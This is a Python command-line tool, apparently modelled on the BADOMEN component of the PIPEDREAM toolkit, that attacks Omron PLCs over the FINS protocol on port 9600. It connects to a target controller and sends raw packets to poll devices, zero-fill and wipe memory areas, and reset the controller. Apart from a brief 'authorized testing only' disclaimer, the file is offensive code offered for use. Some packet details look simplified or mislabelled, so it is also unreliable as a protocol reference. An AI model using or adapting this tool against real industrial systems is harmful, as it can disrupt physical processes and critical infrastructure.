#!/usr/bin/env python3
"""
FINS Protocol Attack Module

Advanced FINS attacks for Omron PLCs.
Part of BADOMEN attack module for PIPEDREAM.

Capabilities:
- Memory area manipulation
- Device polling
- Memory wiping
- PLC reset
- Custom command injection

WARNING: For authorized security testing only.
"""

import socket
import struct
import logging
from typing import Optional, List

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [FINS-ATTACK] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('FINSAttack')


class FINSAttack:
    """FINS Protocol Attack Suite"""

    def __init__(self, target: str, port: int = 9600, timeout: float = 3.0):
        self.target = target
        self.port = port
        self.timeout = timeout

    def wipe_memory(self) -> bool:
        """
        Wipe PLC memory (DESTRUCTIVE)

        Returns:
            True if command sent
        """
        logger.critical(f"[!!!] Wiping memory on {self.target}:{self.port}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Build memory wipe command
            header = self._build_fins_header()
            # Memory area write with zeros
            command = struct.pack('>HBBHB', 0x0102, 0x82, 0x00, 0x0000, 0xFF)
            command += b'\x00' * 255  # Zero fill

            request = header + command

            sock.send(request)
            response = sock.recv(1024)
            sock.close()

            logger.critical("[!!!] Memory wipe command sent")
            return True

        except Exception as e:
            logger.error(f"Memory wipe error: {e}")
            return False

    def reset_plc(self) -> bool:
        """
        Reset PLC

        Returns:
            True if reset command sent
        """
        logger.critical(f"[!!!] Resetting PLC {self.target}:{self.port}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Build PLC reset command
            header = self._build_fins_header()
            command = struct.pack('>H', 0x0401)  # Run command

            request = header + command

            sock.send(request)
            sock.close()

            logger.critical("[!!!] Reset command sent")
            return True

        except Exception as e:
            logger.error(f"Reset error: {e}")
            return False

    def poll_devices(self) -> List[str]:
        """
        Poll for connected devices

        Returns:
            List of device addresses
        """
        logger.info(f"[*] Polling for connected devices on {self.target}")

        devices = []

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Build device poll command
            header = self._build_fins_header()
            command = struct.pack('>H', 0x0901)  # Network status read

            request = header + command

            sock.send(request)
            response = sock.recv(4096)
            sock.close()

            # Parse device list from response
            if len(response) > 16:
                logger.info(f"[+] Received device data: {len(response)} bytes")
                # Simplified parsing
                devices.append(self.target)

        except Exception as e:
            logger.error(f"Device poll error: {e}")

        return devices

    def _build_fins_header(self, sid: int = 0x01) -> bytes:
        """Build FINS command header"""
        header = bytearray()
        header.append(0x80)  # ICF
        header.append(0x00)  # RSV
        header.append(0x02)  # GCT
        header.append(0x00)  # DNA
        header.append(0x00)  # DA1
        header.append(0x00)  # DA2
        header.append(0x00)  # SNA
        header.append(0x00)  # SA1
        header.append(0x00)  # SA2
        header.append(sid)   # SID

        return bytes(header)


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description='FINS Attack Tool (BADOMEN)',
        epilog="WARNING: For authorized security testing only!"
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target PLC IP')
    parser.add_argument('--port', '-p', type=int, default=9600,
                        help='FINS port (default: 9600)')
    parser.add_argument('--poll', action='store_true',
                        help='Poll for connected devices')
    parser.add_argument('--wipe', action='store_true',
                        help='Wipe memory (DESTRUCTIVE)')
    parser.add_argument('--reset', action='store_true',
                        help='Reset PLC (DESTRUCTIVE)')

    args = parser.parse_args()

    attacker = FINSAttack(args.target, args.port)

    if args.poll:
        devices = attacker.poll_devices()
        print(f"\nFound {len(devices)} device(s)")

    if args.wipe:
        print("\n[!!!] WARNING: This will WIPE PLC MEMORY!")
        response = input("Are you sure? (yes/no): ")
        if response.lower() == 'yes':
            attacker.wipe_memory()

    if args.reset:
        print("\n[!!!] WARNING: This will RESET the PLC!")
        response = input("Are you sure? (yes/no): ")
        if response.lower() == 'yes':
            attacker.reset_plc()

    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
